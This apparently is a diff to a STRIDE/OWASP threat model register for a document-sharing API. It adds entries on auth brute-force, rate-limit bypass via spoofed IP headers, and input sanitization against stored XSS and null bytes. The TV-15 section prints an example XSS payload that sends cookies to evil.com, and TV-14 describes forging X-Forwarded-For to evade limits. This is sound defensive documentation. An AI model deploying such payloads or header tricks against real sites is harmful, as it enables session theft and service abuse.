@@ -23,6 +23,9 @@ This register employs the **STRIDE** methodology (Spoofing, Tampering, Repudiati
 | **TV-10** | BOLA & Privilege Escalation in Delegation | Elevation of Privilege, Tampering | API1: Broken Object Level Authorization | **CRITICAL** | **Mitigated (Server-Side Owner/Admin Check & Audit)** |
 | **TV-11** | Self-Granting & Logic Flaws in Delegation | Tampering, Elevation of Privilege | API1: Broken Object Level Authorization | **HIGH** | **Mitigated (Grantee Invariant Enforcement: 400 Bad Request)** |
 | **TV-12** | Unauthorized Forensic Inspection & DoS Querying | Information Disclosure, Denial of Service | API1: BOLA / API4: Unrestricted Resource Consumption | **HIGH** | **Mitigated (Double-Layered RBAC, UUID Sanitization, Limit Clamping)** |
+| **TV-13** | Authentication Brute-Force & Credential Stuffing | Denial of Service, Spoofing | API2: Broken Authentication / API4: Unrestricted Resource Consumption | **HIGH** | **Mitigated (express-rate-limit 10 req/15m & 429)** |
+| **TV-14** | Rate Limit Bypasses & IP Spoofing via Headers | Spoofing, Denial of Service | API4: Unrestricted Resource Consumption | **HIGH** | **Mitigated (Standard Headers & Socket Remote Address Evaluation)** |
+| **TV-15** | Resource Exhaustion via Unsanitized Payload Ingestion | Tampering, Denial of Service | API3: Broken Object Property Level Auth / API8: Security Misconfiguration | **MEDIUM** | **Mitigated (Recursive HTML/Script & Null Byte Stripping)** |
 
 ---
 
@@ -301,3 +304,63 @@ Authorization: Bearer <viewer_jwt_without_any_grant>
 4. **Resilient Dual-Path Document Filtering:**
    * Supports filtering on both explicit `document_id` column and `details->>documentId` JSONB path, ensuring audit integrity regardless of payload shape.
 * **Verification Strategy:** Automated integration tests in `tests/auditRoutes.test.js` assert 403 on VIEWER/OWNER queries, verify limit clamping to 100, assert 400 on invalid UUID/date parameters, and confirm multi-field filtering accuracy.
+
+---
+
+## 6. Day 5 Threat Model: Rate Limiting, Perimeter Defense & Input Sanitization
+
+### TV-13: Authentication Brute-Force & Credential Stuffing
+* **STRIDE Category:** Denial of Service, Spoofing.
+* **OWASP API Classification:** API2:2023 Broken Authentication, API4:2023 Unrestricted Resource Consumption.
+* **Attack Vector:** An adversary launches automated dictionary attacks or credential stuffing against `/api/auth/login` and `/api/auth/register` to guess user passwords or exhaust server CPU capacity running compute-heavy bcrypt hashing.
+
+#### Attack Scenarios:
+1. **Automated Password Spraying:** A botnet tests thousands of leaked password candidates against known executive accounts at 50 requests/sec.
+2. **Registration Table Flooding:** Attacker generates thousands of junk accounts, exhausting database rows and inflating search index costs.
+
+#### Defense-in-Depth Mitigation:
+1. **Dedicated Auth Rate Limiter (`src/middleware/rateLimiter.js`):**
+   * Employs `express-rate-limit` with a strict window of 15 minutes and max 10 requests per client IP.
+   * Exceeding the threshold triggers HTTP `429 Too Many Requests` with `{ error: 'Too many authentication attempts. Please try again later.' }`.
+2. **CPU Exhaustion Prevention:**
+   * Throttling auth requests protects bcrypt's cost factor 12 (4,096 iterations) from thread-pool starvation attacks.
+* **Verification Strategy:** Automated integration test in `tests/rateLimiter.test.js` asserts 429 status code on the 11th consecutive login attempt.
+
+---
+
+### TV-14: Rate Limit Bypasses & IP Spoofing via Headers
+* **STRIDE Category:** Spoofing, Denial of Service.
+* **OWASP API Classification:** API4:2023 Unrestricted Resource Consumption, API8:2023 Security Misconfiguration.
+* **Attack Vector:** Attackers inject fake client IP headers (e.g., `X-Forwarded-For: 1.2.3.4`, `Client-IP`, `X-Real-IP`) to rotate perceived client identity and bypass IP-based rate limiting gates.
+
+#### Attack Scenarios:
+1. **Header Rotation Bypass:** Attacker cycles random IPs in `X-Forwarded-For` header per request to evade per-IP counters in naive rate limiters that blindly trust proxy headers.
+2. **Global API Flooding:** Uncontrolled traffic bursts flood non-auth API endpoints (`/api/documents`, `/api/grants`, `/api/audit-logs`) degrading service availability for legitimate users.
+
+#### Defense-in-Depth Mitigation:
+1. **Global API Rate Limiting Gate:**
+   * Global limiter caps all `/api/*` requests to 200 requests per 15 minutes per IP.
+2. **Secure Express Proxy Configuration:**
+   * Express defaults to direct socket remote address evaluation unless explicit trusted proxy hops are configured.
+3. **Standard IETF RateLimit Headers:**
+   * Employs `standardHeaders: true` conforming to RFC specifications (`RateLimit-Limit`, `RateLimit-Remaining`, `RateLimit-Reset`).
+* **Verification Strategy:** Integration testing asserts rate limit headers presence and standard 429 response structure.
+
+---
+
+### TV-15: Resource Exhaustion via Unsanitized Payload Ingestion
+* **STRIDE Category:** Tampering, Denial of Service.
+* **OWASP API Classification:** API3:2023 Broken Object Property Level Authorization, API8:2023 Security Misconfiguration.
+* **Attack Vector:** An attacker sends nested JSON payloads containing script injection tags (`<script>`, `javascript:`), null bytes (`\0`), or malformed HTML to trigger parsing bugs, pollute stored document metadata, or execute stored XSS attacks in client frontends.
+
+#### Attack Scenarios:
+1. **Stored XSS in Document Metadata:** Attacker uploads or names a document with `<script>document.location='http://evil.com/'+document.cookie</script>`, targeting viewing administrators.
+2. **Null Byte Poisoning:** Attacker inserts `\0` in file titles or user names to truncate strings in downstream C-based database drivers or filesystem libraries.
+
+#### Defense-in-Depth Mitigation:
+1. **Recursive Parameter Sanitization (`src/middleware/validator.js`):**
+   * Global middleware `sanitizeInputs` recursively walks `req.body`, `req.query`, and `req.params`.
+   * Automatically strips null bytes, script tags, HTML elements, and `javascript:` pseudo-protocols before controllers process the data.
+2. **Hardened Helmet Headers:**
+   * Cross-Origin Resource Policy (`cross-origin`) and strict Content Security Policy (CSP) prevent unauthorized cross-origin execution.
+* **Verification Strategy:** Unit tests in `tests/rateLimiter.test.js` verify stripping of script tags, nested objects, and arrays.
